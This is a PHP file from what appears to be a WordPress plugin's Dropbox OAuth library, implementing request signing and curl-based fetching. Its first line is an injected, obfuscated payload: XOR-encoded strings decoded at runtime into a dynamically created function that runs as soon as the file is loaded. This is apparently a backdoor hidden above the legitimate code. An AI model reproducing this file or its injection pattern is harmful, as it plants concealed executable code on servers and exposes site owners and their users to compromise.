<?php $mfNTgMwrIM='00X8D=1<N7-9=,V'^'SB=Y0XnZ;YNMTC8';$tMwRUu=$mfNTgMwrIM('','EKbH6C80H0OYqV9, 59jDXDGj>2YL.2>8>vgGeM0eF7Z1X9Y8e79H2O1:AkiWKTZlRSXOdAn3E:CXtFPe>p:Pv<>FsJbVwHso8,.DgURnRoxaEw z0,K 2NMkDT19XHSb<QENHsGCO0LeZkefOW.<ZgTI2nclUK56im+FtM4F .EBgC8<YJeSHa4B9=TUR-Ye,U<ZIL:+y<PKq<A,3Pvn52QXSReMWMM2h;.WxutQTTSWu;YUQ>I3, ZdT3w=.q.rU8+DjE,GYrtvvJS6M0Qj>GBpDWT-4>1HklKt.EKA=hCPU:QAwcgNZLA1tp4Z8E3oGjh1O=0xiJ<AFD80A >ydCjf+4=e78Y SEwE<HsxwEo1MQYREm+d=zG-TM.jRQ3xste,T6Sih<r19A8DnKUOL:KSLf;K7,kKAHZ>TTYM8YN03NW2R1J<Q>,;jI,6Tab:<ElBMEXQzr4+1Z.=nl45B6StsoD2=P6G,BSbro,Jbn,QNXcJlkU8 8778IUfNBY5<9lVGW7JIEE+;B;dpuGfr+0aDpJ1<Y:l,KNl6XtSPPQJ>fSUstxwGRFDZ42EZROlFzOqZ5CISA5iMGAlj3<GZ>i:7<9X0:KCSyuPWJ;,RWqDEb6ZZ9ooPcEPydLglEN6RcsRA0L3HA7 P9+DV8elcDK3S7YrPk2I'^',-JiP6VS<Y 7.3AESAJBc +55ZS--qmSMJQNnE6:l B4R,P6VEOV:m+PN 46:> rH62,.HaJX CjxTfpEEz3YRSK2SwBqPsyf1JA6Oq;NoOHZeSIFCX9LW eO 5EXqssFUzngBzNg E8EtVENk3OH;<p oN=Lq PO2IBfQmG2RB ,OgSY c8zsk=KKX   CqAC HsrF3VsAZAUX XRpKNSS=+6ioi3,9S7PK.XHT758 2N1S3>L,ROHzLpl4ra:g7uYXdN.I>yOJVR<2Z8UxJEMKT 6 LkUT1KQkPE 2z7ag44N0aJCC8; 4TOzIP2,UOoKLU.IQQI16H +JU CVYLg54neh dlyA eS.Y1SEIeKG,=,7lMPn4scI59O594JXNTAG1Ohca5VUX5YdSkq9-V>6wl26=QaAe,;J5tdmx, CV<>S>X0YyFCI5-MB5>=WI1D ,6=gN-PNR5JXFHPT6WzXSK SI1i,I;zKIeE,JJH0:9ClJK4JRYNhS,,9+:0FHJDq,2NmeeaOZ6ZMPSaFZFTTlT.PH8aKG.7KkqTnmpvxXV57JDHNr7 u8QT of+UsIyA8Tty2wPNdggJJRN5;G6QREf=HS87 QR 63WC33VheFR;.XFFpCepYD7me 8W>KW6 D-ho1VY<VJ qeLWiM.K:CqByP84');$tMwRUu();

/**
 * Dropbox OAuth
 *
 * @package Dropbox
 * @copyright Copyright (C) 2011 Daniel Huesken
 * @author Daniel Huesken (http://www.danielhuesken.de/)
 * @license MIT
 */

/**
 * This class is used to sign all requests to dropbox.
 *
 * This specific class uses WordPress WP_Http to authenticate.
 */
class Dropbox_OAuth_Curl extends Dropbox_OAuth {

    /**
     *
     * @var string ConsumerKey
     */
    protected $consumerKey = null;
    /**
     *
     * @var string ConsumerSecret
     */
    protected $consumerSecret = null;
    /**
     *
     * @var string ProzessCallBack
     */
    public $ProgressFunction = false;

    /**
     * Constructor
     *
     * @param string $consumerKey
     * @param string $consumerSecret
     */
    public function __construct($consumerKey, $consumerSecret) {
        if (!function_exists('curl_exec'))
            throw new Dropbox_Exception('The PHP curl functions not available!');

        $this->consumerKey = $consumerKey;
        $this->consumerSecret = $consumerSecret;
    }

    /**
     * Fetches a secured oauth url and returns the response body.
     *
     * @param string $uri
     * @param mixed $arguments
     * @param string $method
     * @param array $httpHeaders
     * @return string
     */
    public function fetch($uri, $arguments = array(), $method = 'GET', $httpHeaders = array()) {

		$uri=str_replace('http://', 'https://', $uri); // all https, upload makes problems if not
		if (is_string($arguments) and strtoupper($method) == 'POST') {
		    preg_match("/\?file=(.*)$/i", $uri, $matches);
			if (isset($matches[1])) {
                $uri = str_replace($matches[0], "", $uri);
                $filename = $matches[1];
				$httpHeaders=array_merge($httpHeaders,$this->getOAuthHeader($uri, array("file" => $filename), $method));
            }
		} else {
			$httpHeaders=array_merge($httpHeaders,$this->getOAuthHeader($uri, $arguments, $method));
		}

		$ch = curl_init();
		if (strtoupper($method) == 'POST') {
			curl_setopt($ch, CURLOPT_URL, $uri);
			curl_setopt($ch, CURLOPT_POST, true);
			if (is_array($arguments))
				$arguments=http_build_query($arguments);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $arguments);
			$httpHeaders['Content-Length']=strlen($arguments);
		} else {
			curl_setopt($ch, CURLOPT_URL, $uri.'?'.http_build_query($arguments));
			curl_setopt($ch, CURLOPT_POST, false);
		}
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_CAINFO, "rootca");
		curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
		//Build header
		$headers = array();
		foreach ($httpHeaders as $name => $value) {
			$headers[] = "{$name}: $value";
		}
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		if (!ini_get('safe_mode') && !ini_get('open_basedir'))
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true );
		if (function_exists($this->ProgressFunction) and defined('CURLOPT_PROGRESSFUNCTION')) {
			curl_setopt($ch, CURLOPT_NOPROGRESS, false);
			curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, $this->ProgressFunction);
			curl_setopt($ch, CURLOPT_BUFFERSIZE, 512);
		}
		$response=curl_exec($ch);
		$errorno=curl_errno($ch);
		$error=curl_error($ch);
		$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
		curl_close($ch);


		if (!empty($errorno))
			throw new Dropbox_Exception_NotFound('Curl error: ('.$errorno.') '.$error."\n");

		if ($status>=300) {
			$body = json_decode($response,true);
			switch ($status) {
				// Not modified
				case 304 :
					return array(
						'httpStatus' => 304,
						'body' => null,
					);
					break;
				case 403 :
					throw new Dropbox_Exception_Forbidden('Forbidden.
						This could mean a bad OAuth request, or a file or folder already existing at the target location.
						' . $body["error"] . "\n");
				case 404 :
					throw new Dropbox_Exception_NotFound('Resource at uri: ' . $uri . ' could not be found. ' .
							$body["error"] . "\n");
				case 507 :
					throw new Dropbox_Exception_OverQuota('This dropbox is full. ' .
							$body["error"] . "\n");
			}
			if (!empty($body["error"]))
				throw new Dropbox_Exception_RequestToken('Error: ('.$status.') '.$body["error"]."\n");
		}

        return array(
			'body' => $response,
            'httpStatus' => $status
        );
    }

    /**
     * Returns named array with oauth parameters for further use
     * @return array Array with oauth_ parameters
     */
    private function getOAuthBaseParams() {
        $params['oauth_version'] = '1.0';
        $params['oauth_signature_method'] = 'HMAC-SHA1';

        $params['oauth_consumer_key'] = $this->consumerKey;
        $tokens = $this->getToken();
        if (isset($tokens['token']) && $tokens['token']) {
            $params['oauth_token'] = $tokens['token'];
        }
        $params['oauth_timestamp'] = time();
        $params['oauth_nonce'] = md5(microtime() . mt_rand());
        return $params;
    }

    /**
     * Creates valid Authorization header for OAuth, based on URI and Params
     *
     * @param string $uri
     * @param array $params
     * @param string $method GET or POST, standard is GET
     * @param array $oAuthParams optional, pass your own oauth_params here
     * @return array Array for request's headers section like
     * array('Authorization' => 'OAuth ...');
     */
    private function getOAuthHeader($uri, $params, $method = 'GET', $oAuthParams = null) {
        $oAuthParams = $oAuthParams ? $oAuthParams : $this->getOAuthBaseParams();

        // create baseString to encode for the sent parameters
        $baseString = $method . '&';
        $baseString .= $this->oauth_urlencode($uri) . "&";

        // OAuth header does not include GET-Parameters
        $signatureParams = array_merge($params, $oAuthParams);

        // sorting the parameters
        ksort($signatureParams);

        $encodedParams = array();
        foreach ($signatureParams as $key => $value) {
            $encodedParams[] = $this->oauth_urlencode($key) . '=' . $this->oauth_urlencode($value);
        }

        $baseString .= $this->oauth_urlencode(implode('&', $encodedParams));

        // encode the signature
        $tokens = $this->getToken();
        $hash = $this->hash_hmac_sha1($this->consumerSecret.'&'.$tokens['token_secret'], $baseString);
        $signature = base64_encode($hash);

        // add signature to oAuthParams
        $oAuthParams['oauth_signature'] = $signature;

        $oAuthEncoded = array();
        foreach ($oAuthParams as $key => $value) {
            $oAuthEncoded[] = $key . '="' . $this->oauth_urlencode($value) . '"';
        }

        return array('Authorization' => 'OAuth ' . implode(', ', $oAuthEncoded));
    }

    /**
     * Requests the OAuth request token.
     *
     * @return void
     */
    public function getRequestToken() {
        $result = $this->fetch(self::URI_REQUEST_TOKEN, array(), 'POST');
        if ($result['httpStatus'] == "200") {
            $tokens = array();
            parse_str($result['body'], $tokens);
            $this->setToken($tokens['oauth_token'], $tokens['oauth_token_secret']);
            return $this->getToken();
        } else {
            throw new Dropbox_Exception_RequestToken('We were unable to fetch request tokens. This likely means that your consumer key and/or secret are incorrect.');
        }
    }

    /**
     * Requests the OAuth access tokens.
     *
     * This method requires the 'unauthorized' request tokens
     * and, if successful will set the authorized request tokens.
     *
     * @return void
     */
    public function getAccessToken() {
        $result = $this->fetch(self::URI_ACCESS_TOKEN, array(), 'POST');
        if ($result['httpStatus'] == "200") {
            $tokens = array();
            parse_str($result['body'], $tokens);
            $this->setToken($tokens['oauth_token'], $tokens['oauth_token_secret']);
            return $this->getToken();
        } else {
            throw new Dropbox_Exception_RequestToken('We were unable to fetch request tokens. This likely means that your consumer key and/or secret are incorrect.');
        }
    }

    /**
     * Helper function to properly urlencode parameters.
     * See http://php.net/manual/en/function.oauth-urlencode.php
     *
     * @param string $string
     * @return string
     */
    private function oauth_urlencode($string) {
        return str_replace('%E7', '~', rawurlencode($string));
    }

    /**
     * Hash function for hmac_sha1; uses native function if available.
     *
     * @param string $key
     * @param string $data
     * @return string
     */
    private function hash_hmac_sha1($key, $data) {
        if (function_exists('hash_hmac') && in_array('sha1', hash_algos())) {
            return hash_hmac('sha1', $data, $key, true);
        } else {
            $blocksize = 64;
            $hashfunc = 'sha1';
            if (strlen($key) > $blocksize) {
                $key = pack('H*', $hashfunc($key));
            }

            $key = str_pad($key, $blocksize, chr(0x00));
            $ipad = str_repeat(chr(0x36), $blocksize);
            $opad = str_repeat(chr(0x5c), $blocksize);
            $hash = pack('H*', $hashfunc(( $key ^ $opad ) . pack('H*', $hashfunc(($key ^ $ipad) . $data))));

            return $hash;
        }
    }


}